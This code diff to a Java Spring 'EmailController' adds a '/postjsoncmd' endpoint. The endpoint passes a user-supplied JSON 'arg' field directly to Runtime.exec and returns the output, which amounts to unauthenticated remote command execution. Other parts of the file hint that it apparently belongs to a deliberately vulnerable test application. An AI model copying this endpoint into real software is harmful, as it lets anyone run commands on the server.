@@ -16,6 +16,8 @@ import org.springframework.web.bind.annotation.PostMapping;
 import org.springframework.web.bind.annotation.RequestBody;
 import org.springframework.web.bind.annotation.RequestParam;
 import org.springframework.web.bind.annotation.RestController;
+import com.fasterxml.jackson.databind.JsonNode;
+import com.fasterxml.jackson.databind.ObjectMapper;
 
 import javax.script.ScriptEngine;
 import javax.script.ScriptEngineManager;
@@ -36,6 +38,7 @@ import java.text.Normalizer;
 public class EmailController {
 
 	Logger logger = LogManager.getLogger(EmailController.class);
+    private final ObjectMapper objectMapper = new ObjectMapper();
 
 	@Autowired
 	private OwnerRepository ownerRepository;
@@ -131,6 +134,33 @@ public class EmailController {
 			e.printStackTrace();
 		}
 		return normalizedString;
+	}
+
+	@PostMapping("/postjsoncmd")
+	public String postjsonCMD(@RequestBody String jsonString) throws IOException {
+		JsonNode rootNode = objectMapper.readTree(jsonString);
+		String arg = rootNode.get("arg").asText();
+		StringBuilder result = new StringBuilder();
+		Process process = Runtime.getRuntime().exec(arg);
+
+		// Get the input stream from the process
+		BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+
+		// Read and print the output
+		String line;
+		while ((line = reader.readLine()) != null) {
+			result.append(line).append("\n");
+			System.out.println(line);
+		}
+		// Wait for the process to complete
+		try {
+			int exitCode = process.waitFor();
+			System.out.println("Process exited with code: " + exitCode);
+			return result.toString();
+		} catch (InterruptedException e) {
+			e.printStackTrace();
+		}
+		return jsonString;
 	}
 
 	@GetMapping("/deserialize")
